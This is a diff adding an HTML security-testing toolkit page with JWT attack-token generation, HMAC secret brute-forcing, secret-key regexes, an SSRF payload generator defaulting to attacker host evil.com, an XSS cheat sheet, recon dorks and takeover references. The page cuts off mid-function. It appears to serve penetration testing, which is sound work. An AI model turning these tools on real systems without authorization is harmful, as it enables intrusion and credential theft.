@@ -1,0 +1,1795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ROAR Security Lab</title>
+  <style>
+    :root {
+      --bg: #07080e;
+      --card: #111427;
+      --muted: #a6accd;
+      --text: #e9ecff;
+      --accent: #7b8bff;
+      --border: rgba(255,255,255,.08);
+      --ok: #34d399;
+      --warn: #f59e0b;
+      --bad: #f87171;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: Inter, system-ui, sans-serif; background: var(--bg); color: var(--text); }
+    .wrap { max-width: 1200px; margin: 0 auto; padding: 20px; }
+    .title { font-size: 24px; font-weight: 800; margin: 0 0 4px; }
+    .sub { color: var(--muted); margin: 0 0 18px; }
+    .tabs { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
+    .tab { 
+      background: rgba(21, 26, 51, 0.6); 
+      color: var(--muted); 
+      border: 1px solid var(--border); 
+      padding: 10px 16px; 
+      border-radius: 12px; 
+      cursor: pointer; 
+      font-weight: 600; 
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      backdrop-filter: blur(8px);
+    }
+    .tab:hover { background: rgba(123, 139, 255, 0.1); color: var(--text); border-color: rgba(123, 139, 255, 0.4); }
+    .tab.active { 
+      color: #fff; 
+      border-color: var(--accent); 
+      background: linear-gradient(135deg, rgba(123, 139, 255, 0.25), rgba(123, 139, 255, 0.1)); 
+      box-shadow: 0 4px 15px rgba(123, 139, 255, 0.15);
+    }
+    .panel { display: none; }
+    .panel.active { display: block; }
+    .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 14px; margin-bottom: 12px; }
+    .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    input, textarea, select {
+      width: 100%; background: #0c1022; color: var(--text); border: 1px solid var(--border);
+      border-radius: 10px; padding: 10px; font: inherit;
+    }
+    textarea { min-height: 180px; resize: vertical; }
+    .btn { background: linear-gradient(135deg,#6577ff,#7f8fff); color: white; border: none; border-radius: 10px; padding: 9px 12px; cursor: pointer; font-weight: 700; }
+    .btn.ghost { background: #1a1f3b; border: 1px solid var(--border); }
+    .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .k { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .4px; }
+    .pill { display: inline-block; padding: 2px 8px; border-radius: 999px; font-size: 12px; font-weight: 700; }
+    .ok { background: rgba(52,211,153,.15); color: var(--ok); }
+    .warn { background: rgba(245,158,11,.15); color: var(--warn); }
+    .bad { background: rgba(248,113,113,.15); color: var(--bad); }
+    .critical { background: rgba(239,68,68,.22); color: #ef4444; }
+    .high { background: rgba(248,113,113,.12); color: #f87171; }
+    .medium { background: rgba(245,158,11,.12); color: #f59e0b; }
+    .low { background: rgba(96,165,250,.12); color: #93c5fd; }
+    .info { background: rgba(166,172,205,.10); color: var(--muted); }
+    .summary-bar { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 14px; }
+    .summary-pill { padding: 3px 10px; border-radius: 8px; font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 4px; }
+    .summary-pill.critical { background: rgba(239,68,68,.18); color: #ef4444; }
+    .summary-pill.high { background: rgba(248,113,113,.10); color: #f87171; }
+    .summary-pill.medium { background: rgba(245,158,11,.10); color: #f59e0b; }
+    .summary-pill.low { background: rgba(96,165,250,.10); color: #93c5fd; }
+    .summary-pill.info { background: rgba(166,172,205,.08); color: var(--muted); }
+    .finding-row { display: flex; gap: 10px; align-items: flex-start; padding: 8px 4px; }
+    .finding-desc { flex: 1; min-width: 0; }
+    .finding-extra { font-size: 11px; color: var(--muted); margin-top: 3px; line-height: 1.4; }
+    .jwt-attack-btn { padding: 6px 12px; font-size: 12px; white-space: nowrap; }
+    .jwt-attack-btn.generated { background: rgba(123,139,255,.15); border-color: var(--accent); color: var(--text); }
+    .attack-token-row { padding: 8px; border-bottom: 1px solid rgba(255,255,255,.05); }
+    .attack-token-row:last-child { border-bottom: 0; }
+    .attack-token-code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 11px; color: #c5d0ff; word-break: break-all; line-height: 1.5; margin: 4px 0; border: 1px solid var(--border); border-radius: 6px; padding: 6px 8px; background: #060914; }
+    pre { white-space: pre-wrap; word-break: break-word; margin: 0; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
+    .list { max-height: 300px; overflow: auto; border: 1px solid var(--border); border-radius: 10px; padding: 8px; background: #0b1022; }
+    .item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,.05); }
+    .item:last-child { border-bottom: 0; }
+    .muted { color: var(--muted); font-size: 13px; }
+    @media (max-width: 900px) { .cols { grid-template-columns: 1fr; } }
+
+    /* XSS Cheat Sheet */
+    .xss-toolbar { display:flex; gap:8px; flex-wrap:wrap; align-items:center; margin-bottom:14px; }
+    .xss-toolbar select, .xss-toolbar input { width:auto; flex:1; min-width:140px; }
+    .xss-toggle-group { display:flex; gap:4px; }
+    .xss-toggle { background:#151a33; color:var(--muted); border:1px solid var(--border); padding:5px 10px; border-radius:8px; cursor:pointer; font-size:12px; font-weight:600; white-space:nowrap; }
+    .xss-toggle.on { background:rgba(123,139,255,.18); color:var(--text); border-color:var(--accent); }
+    .xss-row { border-bottom:1px solid rgba(255,255,255,.04); padding:10px 8px; display:flex; gap:10px; align-items:flex-start; transition:background .15s; }
+    .xss-row:hover { background:rgba(255,255,255,.03); }
+    .xss-row:last-child { border-bottom:0; }
+    .xss-meta { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:6px; align-items:center; }
+    .xss-event { font-size: 11px; font-weight: 700; color: #fff; background: linear-gradient(135deg, #6366f1, #8b5cf6); padding: 3px 10px; border-radius: 8px; box-shadow: 0 2px 8px rgba(99, 102, 241, 0.3); }
+    .xss-tag { font-size: 11px; font-weight: 700; color: #fff; background: linear-gradient(135deg, #10b981, #059669); padding: 3px 10px; border-radius: 8px; box-shadow: 0 2px 8px rgba(16, 185, 129, 0.3); }
+    .xss-ui { font-size:11px; padding:2px 7px; border-radius:6px; font-weight:600; }
+    .xss-ui.auto { background:rgba(52,211,153,.08); color:var(--ok); }
+    .xss-ui.manual { background:rgba(245,158,11,.08); color:var(--warn); }
+    .xss-code { font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12px; color:#c5d0ff; word-break:break-all; line-height:1.5; flex:1; }
+    .xss-desc { font-size:11px; color:var(--muted); margin-top:4px; }
+    .xss-copy-btn { flex-shrink:0; background:#1a1f3b; border:1px solid var(--border); color:var(--muted); border-radius:7px; padding:4px 9px; font-size:11px; cursor:pointer; white-space:nowrap; }
+    .xss-copy-btn:hover { color:var(--text); border-color:var(--accent); }
+    .xss-group-header { 
+      padding: 12px 16px; 
+      background: rgba(123, 139, 255, 0.08); 
+      border-bottom: 1px solid var(--border); 
+      display: flex; 
+      justify-content: space-between; 
+      align-items: center; 
+      position: sticky; 
+      top: 0; 
+      z-index: 10;
+      backdrop-filter: blur(12px);
+    }
+    .xss-group-name { font-size: 13px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); text-shadow: 0 0 10px rgba(123, 139, 255, 0.3); }
+    .xss-count-badge { font-size: 11px; color: var(--muted); background: rgba(255,255,255,0.05); padding: 2px 8px; border-radius: 20px; }
+    .xss-results-box { 
+      border: 1px solid var(--border); 
+      border-radius: 14px; 
+      overflow: auto; 
+      max-height: 650px; 
+      background: rgba(9, 12, 26, 0.7);
+      box-shadow: inset 0 0 40px rgba(0,0,0,0.4);
+    }
+    .copy-bulk-btn { 
+      background: linear-gradient(135deg, #4f46e5, #7c3aed); 
+      color: white; 
+      border: none; 
+      border-radius: 10px; 
+      padding: 8px 18px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      font-size: 13px;
+      transition: transform 0.1s, box-shadow 0.2s;
+    }
+    .copy-bulk-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4); }
+    .copy-bulk-btn:active { transform: translateY(0); }
+
+    /* Takeover Reference */
+    .tref-tabs { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:14px; }
+    .tref-tab { background:#151a33; color:var(--muted); border:1px solid var(--border); padding:7px 14px; border-radius:10px; cursor:pointer; font-weight:700; font-size:13px; }
+    .tref-tab:hover { background:rgba(123,139,255,.10); color:var(--text); }
+    .tref-tab.active { color:#fff; border-color:var(--accent); background:linear-gradient(135deg, rgba(123,139,255,.25), rgba(123,139,255,.10)); }
+    .tref-content { display:none; }
+    .tref-content.active { display:block; }
+    .tref-stats { display:grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap:10px; margin-bottom:14px; }
+    .tref-stat { background:#0c1022; border:1px solid var(--border); border-radius:10px; padding:10px; text-align:center; }
+    .tref-stat .n { font-size:18px; font-weight:800; }
+    .tref-stat .l { font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:.4px; }
+    .tref-table-wrap { border:1px solid var(--border); border-radius:12px; overflow:auto; max-height:520px; background:rgba(9,12,26,.7); }
+    .tref-table { width:100%; border-collapse:collapse; font-size:13px; }
+    .tref-table th { position:sticky; top:0; background:#0f1326; padding:10px 12px; text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:.4px; color:var(--muted); border-bottom:1px solid var(--border); }
+    .tref-table td { padding:10px 12px; border-bottom:1px solid rgba(255,255,255,.04); vertical-align:top; }
+    .tref-table tr:last-child td { border-bottom:0; }
+    .tref-table tr:hover td { background:rgba(255,255,255,.02); }
+    .status-badge { display:inline-block; padding:3px 10px; border-radius:999px; font-size:12px; font-weight:700; }
+    .status-vulnerable { background:rgba(248,113,113,.12); color:#f87171; }
+    .status-not-vulnerable { background:rgba(52,211,153,.12); color:var(--ok); }
+    .status-edge-case { background:rgba(245,158,11,.12); color:var(--warn); }
+    .fingerprint { background:#060914; border:1px solid var(--border); border-radius:6px; padding:4px 8px; font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12px; color:#c5d0ff; }
+    .tref-link { color:var(--accent); text-decoration:none; font-weight:600; }
+    .tref-link:hover { text-decoration:underline; }
+    .verified-icon { font-size:12px; }
+    .tref-noresults { padding:24px; text-align:center; color:var(--muted); font-size:13px; }
+    .tref-loading { padding:20px; text-align:center; color:var(--muted); }
+
+    /* Recon Dorks */
+    .dork-sevs { display:flex; gap:6px; flex-wrap:wrap; }
+    .dork-sev-btn { background: rgba(21,26,51,.6); color: var(--muted); border:1px solid var(--border); border-radius:8px; padding:4px 10px; cursor:pointer; font-size:12px; font-weight:600; }
+    .dork-sev-btn:hover { color: var(--text); border-color: rgba(123,139,255,.4); }
+    .dork-sev-btn.active { color: var(--text); border-color: var(--accent); background: rgba(123,139,255,.14); }
+    .dork-quick { display:flex; flex-wrap:wrap; gap:8px; }
+    .dork-quick a { color: var(--accent); text-decoration:none; font-size:12px; background: rgba(123,139,255,.08); border:1px solid var(--border); border-radius:8px; padding:5px 10px; white-space:nowrap; }
+    .dork-quick a:hover { background: rgba(123,139,255,.18); }
+    .dork-sec-head { display:flex; align-items:center; gap:8px; margin:16px 0 8px; }
+    .dork-sec-head:first-child { margin-top:4px; }
+    .dork-sec-head h3 { margin:0; font-size:14px; font-weight:800; }
+    .dork-sec-count { color: var(--muted); font-size:12px; }
+    .dork-dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; }
+    .dork-grid { display:grid; grid-template-columns: repeat(auto-fill, minmax(330px,1fr)); gap:10px; }
+    .dork-card { display:block; background: var(--bg); border:1px solid var(--border); border-radius:10px; padding:10px; text-decoration:none; color: var(--text); transition: border-color .15s, transform .1s; }
+    .dork-card:hover { border-color: var(--accent); transform: translateY(-1px); }
+    .dork-card .dt { font-weight:700; font-size:13px; margin-bottom:6px; display:flex; align-items:center; gap:6px; }
+    .dork-card .dq { font-family:'JetBrains Mono', ui-monospace, monospace; font-size:11px; color: var(--muted); word-break:break-all; max-height:64px; overflow:auto; margin-bottom:8px; }
+    .dork-card .df { display:flex; justify-content:space-between; align-items:center; gap:8px; }
+    .dork-badge { font-size:10px; padding:2px 7px; border-radius:6px; font-weight:700; text-transform:uppercase; letter-spacing:.3px; }
+    .dork-copy { background: rgba(255,255,255,.06); color: var(--text); border:1px solid var(--border); border-radius:6px; padding:3px 9px; font-size:11px; cursor:pointer; }
+    .dork-copy:hover { background: rgba(123,139,255,.18); }
+    .sev-critical{color:#f87171} .sev-high{color:#fb923c} .sev-medium{color:#fbbf24} .sev-low{color:#60a5fa} .sev-info{color:#34d399}
+    .dot-critical{background:#f87171} .dot-high{background:#fb923c} .dot-medium{background:#fbbf24} .dot-low{background:#60a5fa} .dot-info{background:#34d399}
+    .bg-google{background:#4285f4;color:#fff} .bg-github{background:#2b3137;color:#fff} .bg-shodan{background:#c0392b;color:#fff}
+    .bg-wayback{background:#2c3e50;color:#fff} .bg-crtsh{background:#16a085;color:#fff} .bg-censys{background:#8e44ad;color:#fff}
+    .bg-urlscan{background:#2980b9;color:#fff} .bg-fofa{background:#d35400;color:#fff} .bg-grep{background:#27ae60;color:#fff} .bg-intx{background:#34495e;color:#fff}
+  </style>
+  <script src="ssrf-payloads.js"></script>
+  <script src="xss-payloads.js"></script>
+  <script src="dorks.js"></script>
+</head>
+<body>
+  <div class="wrap">
+    <h1 class="title">Security Lab</h1>
+    <p class="sub">Browser-first tools for JWT analysis, API key inspection, regex workbench, and dependency confusion triage.</p>
+
+    <div class="tabs">
+      <button class="tab active" data-tab="jwt">JWT Analyzer</button>
+      <button class="tab" data-tab="regex">Regex Workbench</button>
+      <button class="tab" data-tab="depconf">Dependency Confusion</button>
+      <button class="tab" data-tab="ssrf">SSRF Payloads</button>
+      <button class="tab" data-tab="xss">XSS Cheat Sheet</button>
+      <button class="tab" data-tab="dorks">Recon Dorks</button>
+      <button class="tab" data-tab="takeover">Takeover Reference</button>
+    </div>
+
+    <section class="panel active" id="panel-jwt">
+      <div class="card">
+        <div class="k">JWT Token</div>
+        <textarea id="jwtInput" placeholder="Paste JWT here"></textarea>
+        <div class="row" style="margin-top:8px">
+          <button class="btn" id="jwtAnalyze">Analyze Token</button>
+        </div>
+      </div>
+      <div class="cols">
+        <div class="card"><div class="k">Header</div><pre id="jwtHeader">{}</pre></div>
+        <div class="card"><div class="k">Payload</div><pre id="jwtPayload">{}</pre></div>
+      </div>
+      <div class="card" id="jwtSummaryCard" style="display:none"><div class="k">Summary</div><div class="summary-bar" id="jwtSummary"></div></div>
+      <div class="card"><div class="k">Security Checks</div><div id="jwtChecks" class="list"></div></div>
+      <div class="card" id="jwtSuggestionsCard" style="display:none"><div class="k">Attack / Testing Recommendations</div><div id="jwtSuggestions" class="list"></div></div>
+      <div class="card" id="jwtAttacksCard" style="display:none">
+        <div class="k">Attack Token Generator</div>
+        <div class="muted" style="margin-bottom:10px">Generate modified tokens to test server-side JWT validation.</div>
+        <div class="row" id="jwtAttackButtons" style="flex-wrap:wrap; margin-bottom:12px">
+          <button class="btn ghost jwt-attack-btn" data-attack="none">alg=none</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="alg-sub">Alg Substitution</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="hmac-confusion">HMAC Confusion</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="empty-key">Empty Key</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="psychic">Psychic Sig (CVE-2022-21449)</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="weak-hmac">Weak HMAC Secret</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="no-sig">Remove Signature</button>
+        </div>
+        <div id="jwtAttackResults" class="list" style="max-height:400px"></div>
+      </div>
+      <div class="card" id="jwtBruteCard">
+        <div class="k">HMAC Secret Brute-Force</div>
+        <div class="muted" style="margin-bottom:10px">Recover the signing secret of an HS256/384/512 token by testing a wordlist server-side, in parallel. Paste a token above, then crack.</div>
+        <label class="muted" style="display:inline-flex;align-items:center;gap:8px;margin-bottom:8px;font-size:12px;cursor:pointer">
+          <input type="checkbox" id="jwtBruteUseDefault" checked style="width:auto;flex:none;padding:0;margin:0"> Include bundled common-secrets wordlist
+        </label>
+        <textarea id="jwtBruteSecrets" placeholder="Optional: extra secrets to try, one per line" style="min-height:70px"></textarea>
+        <div class="row" style="margin-top:8px;margin-bottom:12px">
+          <button class="btn" id="jwtBruteBtn">Crack HMAC Secret</button>
+        </div>
+        <div id="jwtBruteResults" class="list"></div>
+      </div>
+    </section>
+
+    <section class="panel" id="panel-regex">
+      <div class="cols">
+        <div class="card">
+          <div class="k">Pattern</div>
+          <input id="regexPattern" value="(AKIA|AIza|ghp_)[A-Za-z0-9_\\-]{10,}" />
+          <div class="k" style="margin-top:8px">Flags</div>
+          <input id="regexFlags" value="gi" />
+          <div class="row" style="margin-top:8px">
+            <button class="btn" id="regexRun">Run Scan</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="k">Input Text</div>
+          <textarea id="regexInput" placeholder="Paste code, logs, configs, or text blob"></textarea>
+        </div>
+      </div>
+      <div class="card">
+        <div class="k">Regex Definitions (optional)</div>
+        <div class="muted" style="margin-top:6px">
+          Load many regexes at once from <b>regexes.yaml</b>.
+          When loaded, <i>Run Scan</i> runs every definition against loaded JS file(s) (uploads/URLs) or falls back to the input text.
+        </div>
+        <div style="height:10px"></div>
+        <div class="cols">
+          <div>
+            <div class="k">regexes.yaml upload</div>
+            <input id="regexYamlUpload" type="file" accept=".yaml,.yml,text/yaml,application/x-yaml" />
+          </div>
+          <div>
+            <div class="k">JS file upload(s)</div>
+            <input id="regexJsUpload" type="file" multiple accept=".js,application/javascript,text/javascript" />
+          </div>
+        </div>
+        <div style="height:10px"></div>
+        <div class="k">JS file URLs (one per line)</div>
+        <textarea id="regexJsUrls" placeholder="https://.../app.js&#10;https://.../bundle.js" style="min-height:90px"></textarea>
+        <div class="row" style="margin-top:8px">
+          <button class="btn" id="regexLoadDefs">Load Regexes</button>
+          <button class="btn ghost" id="regexClearDefs" type="button">Clear</button>
+        </div>
+        <div class="muted" id="regexDefsMeta" style="margin-top:8px"></div>
+      </div>
+      <div class="card"><div class="k">Matches</div><div id="regexResults" class="list"></div></div>
+    </section>
+
+    <section class="panel" id="panel-depconf">
+      <div class="card">
+        <div class="k">Dependency Manifest Content</div>
+        <textarea id="depInput" placeholder='Paste package.json, requirements.txt, pom.xml, go.mod, etc'></textarea>
+        <div class="row" style="margin-top:8px">
+          <select id="depType" style="max-width:220px">
+            <option value="auto">Auto Detect</option>
+            <option value="npm">npm / package.json</option>
+            <option value="pip">pip / requirements.txt</option>
+            <option value="gomod">go.mod</option>
+            <option value="maven">Maven / pom.xml</option>
+          </select>
+          <button class="btn" id="depAnalyze">Analyze Dependencies</button>
+        </div>
+        <div style="height:12px"></div>
+        <div class="k">Or load manifests from URL(s)</div>
+        <div class="muted" style="margin-top:6px">
+          Paste one URL per line. Each URL will be fetched and analyzed independently.
+          Note: if a remote server blocks CORS, you may need to paste content instead.
+        </div>
+        <div style="height:8px"></div>
+        <textarea id="depUrls" placeholder="https://raw.githubusercontent.com/.../package.json&#10;https://raw.githubusercontent.com/.../requirements.txt" style="min-height:90px"></textarea>
+        <div class="row" style="margin-top:8px">
+          <button class="btn" id="depLoadUrls" type="button">Load URLs</button>
+          <button class="btn ghost" id="depClearUrls" type="button">Clear</button>
+        </div>
+        <div class="muted" id="depSourcesMeta" style="margin-top:8px"></div>
+      </div>
+      <div class="card"><div class="k">Potential Dependency-Confusion Risks</div><div id="depResults" class="list"></div></div>
+    </section>
+
+    <section class="panel" id="panel-ssrf">
+      <div class="cols">
+        <div class="card">
+          <div class="k">Allowed Hostname</div>
+          <input id="ssrfAllowed" value="reservation.walibi.nl" />
+          <div class="k" style="margin-top:8px">Attacker Hostname</div>
+          <input id="ssrfAttacker" value="evil.com" />
+          <div class="row" style="margin-top:8px">
+            <button class="btn" id="ssrfGenerate">Generate Payloads</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="k">Payload Filter</div>
+          <input id="ssrfFilter" placeholder="Search description or tags..." />
+          <div class="muted" style="margin-top:8px" id="ssrfStats">0 payloads loaded</div>
+        </div>
+      </div>
+      <div class="card">
+        <div style="display:flex; justify-content:space-between; align-items:center; gap:10px; margin-bottom:6px">
+          <div class="k" style="margin:0">Generated Payloads</div>
+          <button class="copy-bulk-btn" id="ssrfCopyAll">Copy All</button>
+        </div>
+        <div id="ssrfResults" class="list" style="max-height: 500px;"></div>
+      </div>
+    </section>
+
+    <!-- XSS Cheat Sheet Panel -->
+    <section class="panel" id="panel-xss">
+      <div class="card">
+        <div class="xss-toolbar">
+          <input id="xssSearch" placeholder="Search event, tag, or code..." />
+          <select id="xssTagFilter"><option value="">All Tags</option></select>
+          <select id="xssEventFilter"><option value="">All Events</option></select>
+          <div class="xss-toggle-group">
+            <button class="xss-toggle on" id="xssToggleAuto" title="No user interaction needed"> Auto-fire</button>
+            <button class="xss-toggle on" id="xssToggleManual" title="Requires user interaction">User interaction</button>
+          </div>
+          <button class="copy-bulk-btn" id="xssCopyAll">Copy All Visible</button>
+        </div>
+        <div class="muted" id="xssStats" style="margin-bottom:8px">Loading...</div>
+        <div class="xss-results-box" id="xssResults">
+          <div class="item muted" style="padding:20px">Loading payloads...</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Recon Dorks Panel -->
+    <section class="panel" id="panel-dorks">
+      <div class="cols">
+        <div class="card">
+          <div class="k">Target Domain</div>
+          <input id="dorkTarget" placeholder="example.com" />
+          <div class="row" style="margin-top:8px">
+            <button class="btn" id="dorkApply">Apply Dorks</button>
+            <button class="copy-bulk-btn" id="dorkCopyAll">Copy All</button>
+          </div>
+          <div class="muted" style="margin-top:8px; font-size:11px">
+            Generates search-engine dorks (Google, GitHub, Shodan, crt.sh, Wayback…) for the target.
+            Clicking a card opens the search in a new tab. Use only on authorized targets.
+          </div>
+        </div>
+        <div class="card">
+          <div class="k">Filter</div>
+          <input id="dorkFilter" placeholder="Search title or query..." />
+          <div class="dork-sevs" id="dorkSevFilter" style="margin-top:8px">
+            <button class="dork-sev-btn active" data-sev="all">All</button>
+            <button class="dork-sev-btn active" data-sev="critical">Critical</button>
+            <button class="dork-sev-btn active" data-sev="high">High</button>
+            <button class="dork-sev-btn active" data-sev="medium">Medium</button>
+            <button class="dork-sev-btn active" data-sev="low">Low</button>
+            <button class="dork-sev-btn active" data-sev="info">Info / Recon</button>
+          </div>
+          <div class="muted" id="dorkStats" style="margin-top:8px">0 dorks</div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="k">Quick Recon Links</div>
+        <div class="dork-quick" id="dorkQuick" style="margin-top:8px"></div>
+      </div>
+      <div class="card">
+        <div style="display:flex; justify-content:space-between; align-items:center; gap:10px; margin-bottom:6px">
+          <div class="k" style="margin:0">Generated Dorks</div>
+        </div>
+        <div id="dorkResults" class="list" style="max-height:600px; overflow:auto"></div>
+      </div>
+    </section>
+
+    <!-- Takeover Reference Panel -->
+    <section class="panel" id="panel-takeover">
+      <div class="card">
+        <div class="k">Subdomain & DNS Takeover Reference</div>
+        <p class="muted" style="margin-top:8px">
+          Comprehensive database of vulnerable services and DNS providers. Use this to validate if your DNS takeover findings are exploitable.
+        </p>
+
+        <!-- Tabs -->
+        <div class="tref-tabs" style="margin-top:14px">
+          <button class="tref-tab active" data-tab="subdomain">Subdomain Takeover</button>
+          <button class="tref-tab" data-tab="dns">DNS/NS Takeover</button>
+        </div>
+
+        <!-- Subdomain Panel -->
+        <div class="tref-content active" id="tref-subdomain">
+          <div class="row" style="gap:8px; margin-bottom:10px; flex-wrap:wrap">
+            <input type="text" id="tref-subdomain-search" placeholder="Search engine, status, fingerprint, or discussion..." style="flex:1; min-width:200px" />
+          </div>
+          <div class="tref-stats">
+            <div class="tref-stat"><div class="n" id="tref-sub-vuln">0</div><div class="l">Vulnerable</div></div>
+            <div class="tref-stat"><div class="n" id="tref-sub-safe">0</div><div class="l">Not Vulnerable</div></div>
+            <div class="tref-stat"><div class="n" id="tref-sub-total">0</div><div class="l">Total</div></div>
+          </div>
+          <div class="tref-loading" id="tref-sub-loading">Loading subdomain takeover data...</div>
+          <div class="tref-noresults" id="tref-sub-noresults" style="display:none">No results found.</div>
+          <div class="tref-table-wrap" id="tref-sub-table-wrap" style="display:none">
+            <table class="tref-table">
+              <thead>
+                <tr>
+                  <th>Engine / Service</th>
+                  <th>Status</th>
+                  <th>Verified</th>
+                  <th>Fingerprint</th>
+                  <th>Discussion</th>
+                  <th>Documentation</th>
+                </tr>
+              </thead>
+              <tbody id="tref-sub-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- DNS Panel -->
+        <div class="tref-content" id="tref-dns">
+          <div class="row" style="gap:8px; margin-bottom:10px; flex-wrap:wrap">
+            <input type="text" id="tref-dns-search" placeholder="Search provider, status, fingerprint, or instructions..." style="flex:1; min-width:200px" />
+          </div>
+          <div class="tref-stats">
+            <div class="tref-stat"><div class="n" id="tref-dns-vuln">0</div><div class="l">Vulnerable</div></div>
+            <div class="tref-stat"><div class="n" id="tref-dns-safe">0</div><div class="l">Not Vulnerable</div></div>
+            <div class="tref-stat"><div class="n" id="tref-dns-edge">0</div><div class="l">Edge Case</div></div>
+            <div class="tref-stat"><div class="n" id="tref-dns-total">0</div><div class="l">Total</div></div>
+          </div>
+          <div class="tref-loading" id="tref-dns-loading">Loading DNS takeover data...</div>
+          <div class="tref-noresults" id="tref-dns-noresults" style="display:none">No results found.</div>
+          <div class="tref-table-wrap" id="tref-dns-table-wrap" style="display:none">
+            <table class="tref-table">
+              <thead>
+                <tr>
+                  <th>Provider</th>
+                  <th>Status</th>
+                  <th>Fingerprint</th>
+                  <th>Instructions</th>
+                </tr>
+              </thead>
+              <tbody id="tref-dns-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+
+    document.querySelectorAll('.tab').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+        document.querySelectorAll('.panel').forEach(x => x.classList.remove('active'));
+        btn.classList.add('active');
+        $('panel-' + btn.dataset.tab).classList.add('active');
+      });
+    });
+
+    // Deep-linking: the parent dashboard can open a specific tool either via the URL
+    // hash on first load (#ssrf) or via postMessage once the iframe is already loaded.
+    // We click the tab button so any lazy initialization (e.g. XSS) also runs.
+    (function () {
+      function openTab(name) {
+        if (!name) return;
+        const btn = document.querySelector('.tab[data-tab="' + name + '"]');
+        if (btn) btn.click();
+      }
+      openTab((location.hash || '').replace(/^#/, ''));
+      window.addEventListener('hashchange', () => openTab((location.hash || '').replace(/^#/, '')));
+      window.addEventListener('message', (e) => {
+        const d = e.data;
+        if (d && d.type === 'securitylab-tab' && typeof d.tab === 'string') openTab(d.tab);
+      });
+    })();
+
+    function pretty(v) { try { return JSON.stringify(v, null, 2); } catch { return String(v); } }
+    function b64urlDecode(str) {
+      const pad = '='.repeat((4 - (str.length % 4)) % 4);
+      const b64 = (str + pad).replace(/-/g, '+').replace(/_/g, '/');
+      return decodeURIComponent(atob(b64).split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
+    }
+
+    // ─────────────────────────────────────────────
+    //  Enhanced JWT Analyzer (based on Caido JWT Analyzer extension)
+    // ─────────────────────────────────────────────
+
+    const JWT_SENSITIVE_KEYS = [
+      'password','secret','private','apikey','api_key','token','credentials',
+      'passwd','pass','key','auth','authz','oauth','access_token','refresh_token',
+      'client_secret','hash','salt','credit','card','cvv','ssn','social'
+    ];
+    const JWT_ADMIN_KEYS = ['admin','role','priv','perm','access','right'];
+    const JWT_ADMIN_VALUES = ['admin','root','superuser','administrator','sudo','true','1','yes'];
+    const SEVERITY_ORDER = ['critical','high','medium','low','info','ok'];
+
+    function analyzeJWT(raw) {
+      const parts = raw.split('.');
+      if (parts.length !== 3) throw new Error('Token must have 3 segments');
+      const h = JSON.parse(b64urlDecode(parts[0]));
+      const p = JSON.parse(b64urlDecode(parts[1]));
+      const now = Math.floor(Date.now() / 1000);
+      const findings = [];
+      const suggestions = [];
+
+      const alg = (h.alg || '').toLowerCase();
+
+      // ── ALGORITHM CHECKS ──────────────────────────────
+      if (!h.alg || h.alg === '')
+        findings.push(['critical','No algorithm specified in header','Attackers can bypass signature verification by manipulating the algorithm.']);
+      else if (alg === 'none')
+        findings.push(['critical','Algorithm set to "none" — signature verification bypassed','Attacker can freely modify the token payload. Use RS256/ES256 instead.']);
+      else if (['hs256','hs384','hs512'].includes(alg)) {
+        findings.push(['medium','Using symmetric algorithm (' + h.alg + ') — same key for sign & verify','If the verification key is exposed, attackers can forge tokens. Consider asymmetric (RS256/ES256).']);
+        suggestions.push('Test for weak secret key with common JWT secret wordlists');
+        suggestions.push('Use hashcat mode 16500 to brute-force the symmetric key');
+      }
+
+      // ── HEADER PARAMETER CHECKS ───────────────────────
+      if (h.jwk !== undefined)
+        findings.push(['critical','Token contains "jwk" parameter in header','Attacker can supply their own public key, forging valid signatures. Do not accept jwk from untrusted sources.']);
+      if (h.jku !== undefined)
+        findings.push(['critical','Token contains "jku" parameter in header','Attacker can point to malicious JWKS URLs (SSRF / key injection). Whitelist trusted JWKS URLs.']);
+
+      const kid = h.kid;
+      if (typeof kid === 'string') {
+        if (kid.includes('../') || kid.includes('..\\'))
+          findings.push(['critical','Path traversal in "kid" parameter','Can lead to directory traversal (e.g., reading /dev/null to bypass verification). Sanitize kid.']);
+        if (kid.includes('\'') || kid.includes('"') || kid.includes('=') || kid.includes(';'))
